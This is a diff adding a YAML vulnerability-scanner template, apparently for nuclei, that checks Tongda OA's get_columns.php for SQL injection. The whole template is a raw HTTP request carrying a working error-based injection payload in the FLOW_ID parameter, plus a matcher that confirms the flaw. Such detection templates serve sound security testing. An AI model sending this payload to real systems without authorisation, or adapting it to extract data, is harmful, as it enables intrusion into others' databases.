@@ -1,0 +1,17 @@
+http:
+    - matchers:
+        - dsl:
+            - contains(body,'12321') && status_code == 200
+          type: dsl
+      raw:
+        - |
+          GET /general/workflow/query/get_columns.php?FLOW_ID=111111%DF%27%20and%201=(select%201%20from(select%20count(*),concat(111*111,0x7c,0x7c,0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%23 HTTP/1.1
+          Host: {{Hostname}}
+id: tongda-oa-get-columns-sqli
+info:
+    author: SleepingBag945
+    name: 通达OA get_columns.php SQL注入
+    severity: high
+    tags:
+        - 通达oa
+        - tongda
